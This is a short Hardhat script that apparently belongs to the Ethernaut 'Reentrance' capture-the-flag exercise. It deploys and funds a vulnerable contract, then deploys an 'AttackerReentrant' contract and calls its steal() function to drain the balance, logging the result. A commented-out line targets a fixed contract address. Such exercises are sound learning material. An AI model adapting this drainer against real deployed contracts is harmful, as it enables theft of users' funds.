import { ethers } from "hardhat";
var ETHER = ethers.utils.parseEther("0.001");

async function main() {
  const [owner] = await ethers.getSigners();

  const Reentrance = await ethers.getContractFactory("Reentrance");
  // const reentrance = await Reentrance.attach(
  //   "0x5db3195B89cfBbe91e57b25B4152E240e779a864"
  // );
  const reentrance = await Reentrance.deploy();
  await reentrance.deployed();

  await owner.sendTransaction({
    to: reentrance.address,
    value: ETHER,
  });

  console.log(
    "Contract Balance",
    await ethers.provider.getBalance(reentrance.address)
  );

  const AttackerReentrant = await ethers.getContractFactory(
    "AttackerReentrant"
  );
  const attackerReentrant = await AttackerReentrant.deploy(reentrance.address, {
    value: ETHER,
  });
  await attackerReentrant.deployed();

  await attackerReentrant.steal();

  console.log(
    "Contract Balance",
    await ethers.provider.getBalance(reentrance.address)
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  // main2()
  //
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
